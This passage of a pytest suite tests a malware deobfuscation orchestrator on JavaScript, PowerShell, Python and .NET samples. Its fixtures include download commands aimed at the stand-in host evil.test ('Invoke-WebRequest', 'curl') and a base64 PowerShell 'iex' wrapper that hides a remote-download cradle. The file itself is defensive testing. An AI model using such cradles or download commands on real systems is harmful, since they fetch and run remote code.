            sample_id="js-demo-fully-recovered",
            original_code=code,
            language="javascript",
        ).run(max_iterations=12)

        actions = [item.action for item in result.transform_history]
        assert "identify_string_resolver" in actions
        assert "detect_eval_exec_reflection" in actions
        assert "var _0x4a2b = [" not in result.deobfuscated_code
        assert "_0x1a2b3c['push']" not in result.deobfuscated_code
        assert "eval(" not in result.deobfuscated_code
        assert 'var url = "http://example.com/c2payload";' in result.deobfuscated_code
        assert 'var storage = "localStorage";' in result.deobfuscated_code
        assert 'console.log("loaded");' in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_javascript_packer_runs_in_orchestrator(self):
        code = (
            "eval(function(p,a,c,k,e,d){\n"
            "    e=function(c){return c.toString(a)};\n"
            "    if(!''.replace(/^/,String)){\n"
            "        while(c--)d[c.toString(a)]=k[c]||c.toString(a);\n"
            "        k=[function(e){return d[e]}];\n"
            "        e=function(){return'\\\\w+'};\n"
            "        c=1;\n"
            "    }\n"
            "    while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);\n"
            "    return p;\n"
            "}(\n"
            "    '0(\\'1\\');',\n"
            "    2,\n"
            "    2,\n"
            "    'alert|test'.split('|'),\n"
            "    0,\n"
            "    {}\n"
            "))"
        )
        result = await Orchestrator(
            sample_id="js-packer",
            original_code=code,
            language="javascript",
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert "unpack_js_packer" in actions
        assert "alert('test');" in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_javascript_runtime_encoder_runs_in_orchestrator(self):
        code = '[]["filter"]["constructor"]("alert(\\"ok\\")")()'
        result = await Orchestrator(
            sample_id="js-encoder",
            original_code=code,
            language="javascript",
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert "decode_js_encoder" in actions
        assert 'alert("ok")' in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_dotnet_assembly_analyzer_runs_in_orchestrator(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        assembly = build_test_dotnet_assembly(
            """
            using System;

            namespace Sample;

            public class Loader
            {
                public static string Beacon()
                {
                    return "http://evil.test/a";
                }
            }
            """,
            "OrchestratorAssemblySample",
        )
        result = await Orchestrator(
            sample_id="dotnet-assembly",
            original_code=assembly.decode("latin-1"),
            language=None,
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert result.language == "dotnet"
        assert "analyze_dotnet_assembly" in actions
        assert "public string Beacon()" in result.deobfuscated_code
        assert "http://evil.test/a" in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_dotnet_embedded_resource_text_flows_through_orchestrator(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        assembly = build_test_dotnet_assembly_with_resources(
            """
            using System.IO;
            using System.Reflection;

            namespace Sample;

            public class Loader
            {
                public static string ReadPayload()
                {
                    using Stream stream = Assembly.GetExecutingAssembly()
                        .GetManifestResourceStream("DotNetResourceOrchestrator.stage.txt")!;
                    using var reader = new StreamReader(stream);
                    return reader.ReadToEnd();
                }
            }
            """,
            "DotNetResourceOrchestrator",
            {"stage.txt": "Invoke-WebRequest http://evil.test/a"},
        )
        result = await Orchestrator(
            sample_id="dotnet-resource",
            original_code=assembly.decode("latin-1"),
            language=None,
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert result.language == "dotnet"
        assert "analyze_dotnet_assembly" in actions
        assert "DotNetResourceOrchestrator.stage.txt" in result.deobfuscated_code
        assert "Invoke-WebRequest http://evil.test/a" in result.deobfuscated_code
        assert "Invoke-WebRequest http://evil.test/a" in [item.value for item in result.strings]

    @pytest.mark.asyncio
    async def test_dotnet_resx_resource_manager_strings_flow_through_orchestrator(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        assembly = build_test_dotnet_assembly_with_resources(
            """
            using System.Globalization;
            using System.Reflection;
            using System.Resources;

            namespace Sample;

            public class Loader
            {
                private static readonly ResourceManager ResourceManager =
                    new("DotNetResxOrchestrator.Strings", typeof(Loader).Assembly);

                public static string ReadPayload()
                {
                    return ResourceManager.GetString("Payload", CultureInfo.InvariantCulture)!;
                }
            }
            """,
            "DotNetResxOrchestrator",
            {"Strings.resx": build_resx({"Payload": "curl https://evil.test/resx"})},
        )
        result = await Orchestrator(
            sample_id="dotnet-resx-resource",
            original_code=assembly.decode("latin-1"),
            language=None,
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert result.language == "dotnet"
        assert "analyze_dotnet_assembly" in actions
        assert "DotNetResxOrchestrator.Strings.resources" in result.deobfuscated_code
        assert "curl https://evil.test/resx" in result.deobfuscated_code
        assert "curl https://evil.test/resx" in [item.value for item in result.strings]

    @pytest.mark.asyncio
    async def test_dotnet_compressed_and_field_backed_helpers_flow_through_orchestrator(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        assembly = build_test_dotnet_assembly(
            """
            using System;
            using System.IO;
            using System.IO.Compression;
            using System.Text;

            namespace Sample;

            public class Loader
            {
                private static readonly string Blob = "H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA==";

                public static string Inflate()
                {
                    using var source = new MemoryStream(Convert.FromBase64String(Blob));
                    using var gzip = new GZipStream(source, CompressionMode.Decompress);
                    using var reader = new StreamReader(gzip, Encoding.UTF8);
                    return reader.ReadToEnd();
                }
            }
            """,
            "DotNetCompressedHelperOrchestrator",
        )
        result = await Orchestrator(
            sample_id="dotnet-compressed-helper",
            original_code=assembly.decode("latin-1"),
            language=None,
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert result.language == "dotnet"
        assert "analyze_dotnet_assembly" in actions
        assert 'return "hello world";' in result.deobfuscated_code
        assert "hello world" in [item.value for item in result.strings]

    @pytest.mark.asyncio
    async def test_auto_detected_powershell_wrapper_decodes(self):
        blob = (
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
            "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
            "dAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBhACcAKQA="
        )
        code = (
            "iex ([System.Text.Encoding]::Unicode.GetString("
            f"[System.Convert]::FromBase64String('{blob}')))"
        )
        result = await Orchestrator(
            sample_id="ps-wrapper",
            original_code=code,
            language=None,
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert result.language == "powershell"
        assert "decode_base64" in actions
        assert "powershell_decode" in actions
        assert "http://evil.test/a" in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_single_use_string_decryptor_runs_through_orchestrator(self):
        code = (
            "function decodeString(s){return s.split('').reverse().join('');}\n"
            'alert(decodeString("cba"));'
        )
        result = await Orchestrator(
            sample_id="string-helper",
            original_code=code,
            language="javascript",
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert "decrypt_strings" in actions
        assert '"abc"' in result.deobfuscated_code
        assert "abc" in [item.value for item in result.strings]

    @pytest.mark.asyncio
    async def test_python_serialization_decoder_runs_in_orchestrator(self):
        payload = marshal.dumps(
            compile(
                'import os\nurl="http://evil.test"\ndef beacon():\n    return os.name\nprint(beacon())',
                "<x>",
                "exec",
            )
        )
        blob = base64.b64encode(payload).decode()
        code = (
            "import base64, marshal\n"
            f'exec(marshal.loads(base64.b64decode("{blob}")))'
        )
        result = await Orchestrator(
            sample_id="python-serialization",
            original_code=code,
            language="python",
        ).run(max_iterations=12)

        actions = [item.action for item in result.transform_history]
        assert "decode_python_serialization" in actions
        assert "http://evil.test" in result.deobfuscated_code
        assert "http://evil.test" in [item.value for item in result.strings]
        assert "os" in result.state.imports
        assert "beacon" in result.state.functions

    @pytest.mark.asyncio
    async def test_xor_decimal_array_runs_in_orchestrator(self):
        code = "const data = [29,16,25,25,26]; data.map(b => b ^ 0x75)"
        result = await Orchestrator(
            sample_id="xor-decimal",
            original_code=code,
            language="javascript",
        ).run(max_iterations=12)

        actions = [item.action for item in result.transform_history]
        assert "try_xor_recovery" in actions
        assert "hello" in result.deobfuscated_code
        assert "hello" in [item.value for item in result.strings]

    @pytest.mark.asyncio
    async def test_python_exec_compile_literal_chain_runs_in_orchestrator(self):
        code = (
            'src = "print(\\"hi\\")"\n'
            "exec(compile(src, '<x>', 'exec'))"
        )
        result = await Orchestrator(
            sample_id="python-exec-compile",
            original_code=code,
            language="python",
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert "python_decode" in actions
        assert 'print("hi")' in result.deobfuscated_code
